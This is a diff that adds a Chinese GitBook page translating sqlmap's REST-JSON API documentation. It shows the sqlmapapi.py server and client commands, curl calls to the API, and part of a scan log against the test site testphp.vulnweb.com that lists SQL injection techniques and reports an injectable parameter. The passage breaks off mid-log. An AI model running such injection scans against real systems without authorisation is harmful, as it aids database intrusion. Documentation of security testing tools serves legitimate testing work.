@@ -1,0 +1,1181 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>API（REST-JSON） · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../License.html" />
+    
+    
+    <link rel="prev" href="Miscellaneous.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    文档介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../Users-manual.html">
+            
+                <a href="../Users-manual.html">
+            
+                    
+                    用户手册
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../Introduction.html">
+            
+                <a href="../Introduction.html">
+            
+                    
+                    介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../Techniques.html">
+            
+                <a href="../Techniques.html">
+            
+                    
+                    技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../Features.html">
+            
+                <a href="../Features.html">
+            
+                    
+                    特性
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../Download-and-update.html">
+            
+                <a href="../Download-and-update.html">
+            
+                    
+                    下载更新
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../Dependencies.html">
+            
+                <a href="../Dependencies.html">
+            
+                    
+                    相关依赖
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../History.html">
+            
+                <a href="../History.html">
+            
+                    
+                    历史
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="Usage.html">
+            
+                <a href="Usage.html">
+            
+                    
+                    用法
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.8.1" data-path="Output-verbosity.html">
+            
+                <a href="Output-verbosity.html">
+            
+                    
+                    输出详细等级
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.2" data-path="Target.html">
+            
+                <a href="Target.html">
+            
+                    
+                    目标
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.3" data-path="Request.html">
+            
+                <a href="Request.html">
+            
+                    
+                    请求
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.4" data-path="Optimization.html">
+            
+                <a href="Optimization.html">
+            
+                    
+                    优化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.5" data-path="Injection.html">
+            
+                <a href="Injection.html">
+            
+                    
+                    注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.6" data-path="Detection.html">
+            
+                <a href="Detection.html">
+            
+                    
+                    检测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.7" data-path="Techniques.html">
+            
+                <a href="Techniques.html">
+            
+                    
+                    技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.8" data-path="Fingerprint.html">
+            
+                <a href="Fingerprint.html">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.9" data-path="Enumeration.html">
+            
+                <a href="Enumeration.html">
+            
+                    
+                    枚举
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.10" data-path="Brute-force.html">
+            
+                <a href="Brute-force.html">
+            
+                    
+                    暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.11" data-path="User-defined-function-injection.html">
+            
+                <a href="User-defined-function-injection.html">
+            
+                    
+                    用户自定义函数注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.12" data-path="File-system-access.html">
+            
+                <a href="File-system-access.html">
+            
+                    
+                    访问文件系统
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.13" data-path="Operating-system-takeover.html">
+            
+                <a href="Operating-system-takeover.html">
+            
+                    
+                    接管操作系统
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.14" data-path="Windows-registry-access.html">
+            
+                <a href="Windows-registry-access.html">
+            
+                    
+                    访问 Windows 注册表
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.15" data-path="General.html">
+            
+                <a href="General.html">
+            
+                    
+                    常规选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.16" data-path="Miscellaneous.html">
+            
+                <a href="Miscellaneous.html">
+            
+                    
+                    杂项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.8.17" data-path="API.html">
+            
+                <a href="API.html">
+            
+                    
+                    API（REST-JSON）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="../License.html">
+            
+                <a href="../License.html">
+            
+                    
+                    许可证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../Miscellaneous/Miscellaneous.html">
+            
+                <a href="../../Miscellaneous/Miscellaneous.html">
+            
+                    
+                    杂项
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../../Miscellaneous/FAQ.html">
+            
+                <a href="../../Miscellaneous/FAQ.html">
+            
+                    
+                    FAQ
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../../Miscellaneous/Presentations.html">
+            
+                <a href="../../Miscellaneous/Presentations.html">
+            
+                    
+                    展示
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="../../Miscellaneous/Screenshots.html">
+            
+                <a href="../../Miscellaneous/Screenshots.html">
+            
+                    
+                    截图
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="../../Miscellaneous/Third-party-libraries.html">
+            
+                <a href="../../Miscellaneous/Third-party-libraries.html">
+            
+                    
+                    第三方库
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >API（REST-JSON）</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="api&#xFF08;rest-json&#xFF09;">API&#xFF08;REST-JSON&#xFF09;</h1>
+<blockquote>
+<p><em>&#x8BD1;&#x81EA;&#xFF1A;<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage#api-rest-json" target="_blank">API (REST-JSON)</a></em></p>
+</blockquote>
+<p>sqlmap &#x53EF;&#x4EE5;&#x901A;&#x8FC7; REST-JSON API &#x8FD0;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x7528; JSON &#x683C;&#x5F0F;&#x7684; REST&#xFF08;REpresentational State Transfer &#x7684;&#x7F29;&#x5199;&#xFF09;&#x98CE;&#x683C;&#x7684; API &#x6765;&#x8FDB;&#x884C;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x5B9E;&#x4F8B;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;&#x76F4;&#x767D;&#x5730;&#x8BB2;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528; sqlmap &#x8FDB;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x8BBE;&#x7F6E; sqlmap &#x9009;&#x9879;/&#x5F00;&#x5173;&#x5E76;&#x5C06;&#x7ED3;&#x679C;&#x62C9;&#x53D6;&#x56DE;&#x6765;&#x3002;&#x7528;&#x4E8E;&#x8FD0;&#x884C; API &#x7684;&#x4E3B;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x662F; <code>sqlmapapi.py</code>&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x4EE5;&#x5728;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x7A0B;&#x5E8F;&#x4E2D;&#x8FDB;&#x884C;&#x5B9E;&#x73B0;&#x3002;</p>
+<pre><code class="lang-shell">$ python sqlmapapi.py -hh
+Usage: sqlmapapi.py [options]
+
+Options:
+  -h, --help            show this help message and exit
+  -s, --server          Act as a REST-JSON API server
+  -c, --client          Act as a REST-JSON API client
+  -H HOST, --host=HOST  Host of the REST-JSON API server (default &quot;127.0.0.1&quot;)
+  -p PORT, --port=PORT  Port of the the REST-JSON API server (default 8775)
+  --adapter=ADAPTER     Server (bottle) adapter to use (default &quot;wsgiref&quot;)
+</code></pre>
+<p>&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x5F00;&#x5173; <code>-s</code> &#x8FD0;&#x884C; <code>sqlmapapi.py</code> &#x542F;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F7F;&#x7528;&#x5F00;&#x5173; <code>-c</code> &#x542F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5728;&#x8FD9;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#xFF08;&#x53EF;&#x9009;&#xFF09;&#x4F7F;&#x7528;&#x9009;&#x9879; <code>-H</code>&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A; <code>&quot;127.0.0.1&quot;</code>&#xFF09;&#x548C;&#x9009;&#x9879; <code>-p</code>&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A; <code>8775</code>&#xFF09;&#x8BBE;&#x7F6E;&#x76D1;&#x542C;&#x7684; IP &#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x201C;&#x4F1A;&#x8BDD;&#x201D;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x201C;&#x4EFB;&#x52A1;&#x201D;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;&#x8FD0;&#x884C; sqlmap &#x626B;&#x63CF;&#xFF09;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x4EFB;&#x610F;&#x9009;&#x62E9;&#x67D0;&#x4E2A;&#x4EFB;&#x52A1;&#x5904;&#x4E8E;&#x5F53;&#x524D;&#x6D3B;&#x52A8;&#x72B6;&#x6001;&#x3002;</p>
+<p>&#x5BA2;&#x6237;&#x7AEF;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#x53EF;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x6709;&#xFF1A;</p>
+<ul>
+<li><code>help</code>&#x2014;&#x2014;&#x663E;&#x793A;&#x53EF;&#x7528;&#x547D;&#x4EE4;&#x5217;&#x8868;&#x4EE5;&#x53CA;&#x57FA;&#x672C;&#x7684;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</li>
+<li><code>new ARGS</code>&#x2014;&#x2014;&#x4F7F;&#x7528;&#x63D0;&#x4F9B;&#x7684;&#x53C2;&#x6570;&#x5F00;&#x59CB;&#x4E00;&#x6B21;&#x65B0;&#x7684;&#x626B;&#x63CF;&#x4EFB;&#x52A1;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;<code>new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</code>&#xFF09;</li>
+<li><code>use TASKID</code>&#x2014;&#x2014;&#x5207;&#x6362;&#x5F53;&#x524D;&#x4E0A;&#x4E0B;&#x6587;&#x5230;&#x4E0D;&#x540C;&#x4EFB;&#x52A1;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;<code>use c04d8c5c7582efb4</code>&#xFF09;</li>
+<li><code>data</code>&#x2014;&#x2014;&#x83B7;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x5F53;&#x524D;&#x4EFB;&#x52A1;&#x7684;&#x6570;&#x636E;</li>
+<li><code>log</code>- &#x83B7;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x5F53;&#x524D;&#x4EFB;&#x52A1;&#x65E5;&#x5FD7;</li>
+<li><code>status</code>&#x2014;&#x2014;&#x83B7;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x5F53;&#x524D;&#x4EFB;&#x52A1;&#x72B6;&#x6001;</li>
+<li><code>stop</code>&#x2014;&#x2014;&#x505C;&#x6B62;&#x5F53;&#x524D;&#x4EFB;&#x52A1;</li>
+<li><code>kill</code>&#x2014;&#x2014;&#x6740;&#x6B7B;&#x5F53;&#x524D;&#x4EFB;&#x52A1;</li>
+<li><code>list</code>&#x2014;&#x2014;&#x663E;&#x793A;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#xFF08;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#xFF09;</li>
+<li><code>flush</code>&#x2014;&#x2014;&#x6E05;&#x7A7A;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;deletes&#xFF09;</li>
+<li><code>exit</code>&#x2014;&#x2014;&#x9000;&#x51FA;&#x5BA2;&#x6237;&#x7AEF;&#x754C;&#x9762;</li>
+</ul>
+<p>&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-shell">$ python sqlmapapi.py -s -H &quot;0.0.0.0&quot;
+[12:47:51] [INFO] Running REST-JSON API server at &apos;0.0.0.0:8775&apos;..
+[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881
+[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd
+[12:47:51] [DEBUG] REST-JSON API server connected to IPC database
+[12:47:51] [DEBUG] Using adapter &apos;wsgiref&apos; to run bottle
+[12:48:10] [DEBUG] Created new task: &apos;a42ddaef02e976f0&apos;
+[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan
+[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
+[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
+[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages
+[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages
+</code></pre>
+<p>&#x8FD0;&#x884C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-shell">$ python sqlmapapi.py -c -H &quot;192.168.110.1&quot;
+[12:47:53] [DEBUG] Example client access from command line:
+    $ taskid=$(curl http://192.168.110.1:8775/task/new 2&gt;1 | grep -o -I &apos;[a-f0-9
+]\{16\}&apos;) &amp;&amp; echo $taskid
+    $ curl -H &quot;Content-Type: application/json&quot; -X POST -d &apos;{&quot;url&quot;: &quot;http://testp
+hp.vulnweb.com/artists.php?artist=1&quot;}&apos; http://192.168.110.1:8775/scan/$taskid/st
+art
+    $ curl http://192.168.110.1:8775/scan/$taskid/data
+    $ curl http://192.168.110.1:8775/scan/$taskid/log
+[12:47:53] [INFO] Starting REST-JSON API client to &apos;http://192.168.110.1:8775&apos;..
+.
+[12:47:53] [DEBUG] Calling http://192.168.110.1:8775
+[12:47:53] [INFO] Type &apos;help&apos; or &apos;?&apos; for list of available commands
+api&gt; ?
+help        Show this help message
+new ARGS    Start a new scan task with provided arguments (e.g. &apos;new -u &quot;http://
+testphp.vulnweb.com/artists.php?artist=1&quot;&apos;)
+use TASKID  Switch current context to different task (e.g. &apos;use c04d8c5c7582efb4
+&apos;)
+data        Retrieve and show data for current task
+log         Retrieve and show log for current task
+status      Retrieve and show status for current task
+stop        Stop current task
+kill        Kill current task
+list        Display all tasks
+flush       Flush tasks (delete all tasks)
+exit        Exit this client
+api&gt; new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --banner --flush-s
+ession
+[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new
+[12:48:10] [INFO] New task ID is &apos;a42ddaef02e976f0&apos;
+[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start
+[12:48:10] [INFO] Scanning started
+api (a42ddaef02e976f0)&gt; status
+[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
+s
+{
+    &quot;status&quot;: &quot;running&quot;,
+    &quot;returncode&quot;: null,
+    &quot;success&quot;: true
+}
+api (a42ddaef02e976f0)&gt; status
+[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
+s
+{
+    &quot;status&quot;: &quot;terminated&quot;,
+    &quot;returncode&quot;: 0,
+    &quot;success&quot;: true
+}
+api (a42ddaef02e976f0)&gt; log
+[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log
+{
+    &quot;log&quot;: [
+        {
+            &quot;message&quot;: &quot;flushing session file&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:10&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing connection to the target URL&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:10&quot;
+        },
+        {
+            &quot;message&quot;: &quot;checking if the target is protected by some kind of WAF/
+IPS&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:10&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing if the target URL is stable&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:10&quot;
+        },
+        {
+            &quot;message&quot;: &quot;target URL is stable&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing if GET parameter &apos;artist&apos; is dynamic&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;confirming that GET parameter &apos;artist&apos; is dynamic&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;GET parameter &apos;artist&apos; is dynamic&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;heuristic (basic) test shows that GET parameter &apos;artist&apos;
+ might be injectable (possible DBMS: &apos;MySQL&apos;)&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing for SQL injection on GET parameter &apos;artist&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;AND boolean-based blind - WHERE or HAVING claus
+e&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:11&quot;
+        },
+        {
+            &quot;message&quot;: &quot;GET parameter &apos;artist&apos; appears to be &apos;AND boolean-based
+blind - WHERE or HAVING clause&apos; injectable (with --string=\&quot;hac\&quot;)&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (BIGINT UNSIGNED)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla
+use (BIGINT UNSIGNED)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (EXP)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla
+use (EXP)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING,
+ ORDER BY or GROUP BY clause (JSON_KEYS)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.7.8 OR error-based - WHERE, HAVING c
+lause (JSON_KEYS)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (FLOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, OR
+DER BY or GROUP BY clause (FLOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (EXTRACTVALUE)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR
+DER BY or GROUP BY clause (EXTRACTVALUE)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (UPDATEXML)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR
+DER BY or GROUP BY clause (UPDATEXML)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, O
+RDER BY or GROUP BY clause (FLOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 4.1 OR error-based - WHERE, HAVING cla
+use (FLOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL OR error-based - WHERE or HAVING clause (
+FLOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (E
+XTRACTVALUE)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 error-based - Parameter replace (B
+IGINT UNSIGNED)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.5 error-based - Parameter replace (E
+XP)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.7.8 error-based - Parameter replace
+(JSON_KEYS)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:12&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (F
+LOOR)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 error-based - Parameter replace (U
+PDATEXML)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.1 error-based - Parameter replace (E
+XTRACTVALUE)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL inline queries&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt; 5.0.11 stacked queries (comment)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt; 5.0.11 stacked queries&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt; 5.0.11 stacked queries (query SLEEP - c
+omment)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt; 5.0.11 stacked queries (query SLEEP)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &lt; 5.0.12 stacked queries (heavy query - c
+omment)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &lt; 5.0.12 stacked queries (heavy query)&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;testing &apos;MySQL &gt;= 5.0.12 AND time-based blind&apos;&quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:13&quot;
+        },
+        {
+            &quot;message&quot;: &quot;GET parameter &apos;artist&apos; appears to be &apos;MySQL &gt;= 5.0.12 AN
+D time-based blind&apos; injectable &quot;,
+            &quot;level&quot;: &quot;INFO&quot;,
+            &quot;time&quot;: &quot;12:48:23&quot;
+        },
+        {
